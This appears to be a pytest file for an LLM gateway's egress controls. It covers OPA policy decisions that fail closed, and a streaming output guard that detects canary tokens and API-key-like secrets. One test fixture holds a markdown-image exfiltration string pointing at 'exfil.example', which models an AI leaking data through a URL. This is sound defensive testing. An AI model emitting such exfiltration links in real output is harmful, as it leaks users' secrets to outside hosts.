from __future__ import annotations

import json
from collections.abc import Iterator

import httpx
import pytest
from services.llm_gateway.egress import (
    DENY_CODES,
    Detectors,
    EgressInput,
    OpaEgress,
    ReferenceEgress,
    outbound_text,
    parse_decision,
    request_source_types,
)
from services.llm_gateway.policy import NodeRule, PolicyViolation
from services.llm_gateway.sse import SSEOutputGuard, encode_event
from services.llm_gateway.testkit import must_run_opa, opa_server

from .egress_cases import CASES
from .gateway_testkit import base_body

NO_OPA = "no OPA: set SGW_TEST_OPA_URL or start docker"
RULE = NodeRule(("claude-sonnet-5-5",), class_ceiling="C1")


@pytest.mark.parametrize(("name", "inp", "expected"), CASES, ids=[c[0] for c in CASES])
def test_reference_policy_case_table(name, inp, expected):
    decision = ReferenceEgress().evaluate(inp)
    assert decision.deny == tuple(sorted(expected)), name
    assert decision.allow is (not expected)


@pytest.fixture(scope="module")
def opa_url() -> Iterator[str]:
    with opa_server() as url:
        if url is None and must_run_opa():
            pytest.fail(f"{NO_OPA} (CI must run the OPA egress tests)")
        if url is None:
            pytest.skip(NO_OPA)  # sgw-allow-skip: OPA parity needs docker or SGW_TEST_OPA_URL
        yield url


@pytest.mark.slow
def test_opa_and_reference_agree_on_every_case(opa_url):
    for name, inp, expected in CASES:
        r = httpx.post(f"{opa_url}/v1/data/sgw/egress/decision", json={"input": inp}, timeout=5)
        opa = parse_decision(r.json(), "opa")
        ref = ReferenceEgress().evaluate(inp)
        assert (opa.allow, opa.deny, opa.policy_version) == (ref.allow, ref.deny, ref.policy_version), name
        assert opa.deny == tuple(sorted(expected)), name


@pytest.mark.slow
async def test_opa_client_against_the_server(opa_url):
    pdp = OpaEgress(opa_url)
    try:
        assert await pdp.healthy()
        ok = await pdp.decide(EgressInput("R1", "n", "claude-sonnet-5-5", ("C1",), RULE))
        assert ok.allow and ok.pdp == "opa"
        bad = await pdp.decide(EgressInput("R1", "n", "claude-sonnet-5-5", ("C3",), RULE))
        assert not bad.allow and "class_not_allowed_on_route" in bad.deny
    finally:
        await pdp.aclose()


def _opa(handler) -> OpaEgress:
    return OpaEgress("http://opa.invalid", transport=httpx.MockTransport(handler))


@pytest.mark.parametrize(
    "handler",
    [
        lambda r: httpx.Response(500),
        lambda r: httpx.Response(200, json={}),
        lambda r: httpx.Response(200, json={"result": {"allow": True}}),
        lambda r: httpx.Response(200, json={"result": {"allow": True, "deny": ["x"], "policy_version": "v"}}),
        lambda r: httpx.Response(200, content=b"not json"),
    ],
    ids=["http_500", "undefined", "malformed", "allow_with_reasons", "not_json"],
)
async def test_opa_client_fails_closed(handler):
    pdp = _opa(handler)
    with pytest.raises(PolicyViolation) as exc:
        await pdp.decide(EgressInput("R1", "n", "claude-sonnet-5-5", ("C1",), RULE))
    assert exc.value.code == "sgw_egress_policy_unavailable" and exc.value.status == 503
    assert pdp.last_error


async def test_opa_client_unreachable_fails_closed():
    def boom(request: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError("refused", request=request)

    with pytest.raises(PolicyViolation) as exc:
        await _opa(boom).decide(EgressInput("R1", "n", "claude-sonnet-5-5", ("C1",), RULE))
    assert exc.value.status == 503


def test_every_deny_reason_has_a_typed_error():
    reasons = {r for _, _, expected in CASES for r in expected}
    assert reasons <= {r for r, _, _ in DENY_CODES}


def test_detectors_count_without_returning_values():
    d = Detectors(("ZEBRA-TOKEN-91",))
    hits = d.scan('{"t": "see CANARY-7F3A and canary-00ff and ZEBRA-TOKEN-91 and sk-ant-api03-abc"}')
    assert (hits.canary_hits, hits.secret_hits) == (3, 1)
    assert d.scan("CANARY-7F").canary_hits == 0
    assert "7F3A" not in d.scrub("x CANARY-7F3A y") and "ZEBRA" not in d.scrub("ZEBRA-TOKEN-91")
    assert d.may_end_in_canary_prefix("text ending C")
    assert d.may_end_in_canary_prefix("text ending CANARY-7F")
    assert d.may_end_in_canary_prefix("token ZEBRA-TO")
    assert not d.may_end_in_canary_prefix("plain text.")


def _delta(text: str, idx: int = 0) -> bytes:
    return encode_event(
        "content_block_delta",
        {"type": "content_block_delta", "index": idx, "delta": {"type": "text_delta", "text": text}},
    )


def _texts(raw: bytes) -> str:
    out = []
    for chunk in raw.split(b"\n\n"):
        for line in chunk.split(b"\n"):
            if line.startswith(b"data:"):
                data = json.loads(line[5:])
                out.append((data.get("delta") or {}).get("text", ""))
    return "".join(out)


def test_guard_blocks_a_canary_split_across_deltas_and_releases_nothing_of_it():
    guard = SSEOutputGuard(Detectors())
    out = guard.feed(_delta("Pump PS-17 holds. See ![x](https://exfil.example/?q=") + _delta("CAN"))
    assert _texts(out) == "Pump PS-17 holds. See ![x](https://exfil.example/?q="
    out = guard.feed(_delta("ARY-7F") + _delta("3A)"))
    assert out == b"" and guard.blocked_code == "sgw_output_canary_blocked"
    assert guard.feed(_delta("more")) == b"" and guard.flush() == b""


def test_guard_releases_held_prefix_when_it_turns_out_harmless():
    guard = SSEOutputGuard(Detectors())
    assert guard.feed(_delta("Crew staged at C")) == b""
    out = guard.feed(_delta("ASCADE yard."))
    assert _texts(out) == "Crew staged at CASCADE yard." and guard.blocked_code is None


def test_guard_handles_events_split_across_chunks_and_flushes_tail():
    guard = SSEOutputGuard(Detectors())
    payload = _delta("hello ") + _delta("world")
    out = b"".join(guard.feed(payload[i : i + 7]) for i in range(0, len(payload), 7))
    assert _texts(out + guard.flush()) == "hello world"


def test_guard_blocks_secret_in_tool_input():
    guard = SSEOutputGuard(Detectors())
    event = encode_event(
        "content_block_delta",
        {
            "type": "content_block_delta",
            "index": 1,
            "delta": {"type": "input_json_delta", "partial_json": '{"k": "sk-ant-'},
        },
    )
    assert guard.feed(event) and guard.blocked_code is None
    more = encode_event(
        "content_block_delta",
        {
            "type": "content_block_delta",
            "index": 1,
            "delta": {"type": "input_json_delta", "partial_json": 'api03-zz"}'},
        },
    )
    assert guard.feed(more) == b"" and guard.blocked_code == "sgw_key_leak_blocked"


def test_guard_keeps_a_held_prefix_across_ping():
    guard = SSEOutputGuard(Detectors())
    ping = encode_event("ping", {"type": "ping"})
    assert guard.feed(_delta("see C")) == b""
    assert guard.feed(ping) == b""
    assert guard.feed(_delta("ANARY-7F3A")) == b"" and guard.blocked_code == "sgw_output_canary_blocked"


def test_guard_releases_held_events_in_order_at_block_stop():
    guard = SSEOutputGuard(Detectors())
    ping = encode_event("ping", {"type": "ping"})
    stop = encode_event("content_block_stop", {"type": "content_block_stop", "index": 0})
    guard.feed(_delta("ends with C") + ping)
    out = guard.feed(stop)
    assert out.index(b"ends with C") < out.index(b"ping") < out.index(b"content_block_stop")


def test_decision_with_another_policy_version_fails_closed():
    with pytest.raises(PolicyViolation) as exc:
        parse_decision({"result": {"allow": True, "deny": [], "policy_version": "egress-v0"}}, "opa")
    assert exc.value.code == "sgw_egress_policy_unavailable"


async def test_health_probes_the_decision_not_just_opa():
    up = _opa(
        lambda r: httpx.Response(200, json={}) if r.url.path.endswith("decision") else httpx.Response(200)
    )
    assert not await up.healthy()
    ok = _opa(
        lambda r: httpx.Response(
            200, json={"result": {"allow": False, "deny": ["x"], "policy_version": "egress-v1"}}
        )
    )
    assert await ok.healthy()


def test_outbound_text_decodes_base64_sources_and_lists_unscannable_types():
    import base64

    data = base64.b64encode(b"note CANARY-00AB").decode()
    body = base_body(
        messages=[
            {
                "role": "user",
                "content": [
                    {
                        "type": "tool_result",
                        "tool_use_id": "t",
                        "content": [
                            {
                                "type": "document",
                                "source": {"type": "base64", "media_type": "text/plain", "data": data},
                            },
                            {"type": "image", "source": {"type": "url", "url": "https://img.example/a.png"}},
                        ],
                    },
                ],
            }
        ]
    )
    assert Detectors().scan(outbound_text(body)).canary_hits == 1
    assert request_source_types(body) == ("document.base64", "image.url")


def test_opa_egress_client_sends_the_bearer_token(monkeypatch) -> None:
    monkeypatch.setenv("SGW_OPA_TOKEN", "token-for-test-0123456789abcdefghijkl")
    assert (
        OpaEgress("http://opa.invalid")._client.headers["Authorization"].startswith("Bearer token-for-test")
    )
